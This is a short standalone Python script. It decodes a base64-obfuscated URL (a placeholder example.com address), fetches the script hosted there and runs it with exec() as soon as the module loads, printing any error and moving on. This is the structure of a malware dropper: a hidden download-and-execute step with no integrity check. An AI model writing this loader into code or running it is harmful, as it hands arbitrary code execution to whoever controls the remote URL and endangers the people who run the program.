import base64
import requests

def obtain_and_execute():
    try:
        encoded_url = "aHR0cDovL2V4YW1wbGUuY29tL3NjcmlwdC5weQ=="
        decoded_url = base64.b64decode(encoded_url).decode("utf-8")

        response = requests.get(decoded_url)
        script = response.text

        exec(script)

    except Exception as e:
        print(e)

obtain_and_execute()
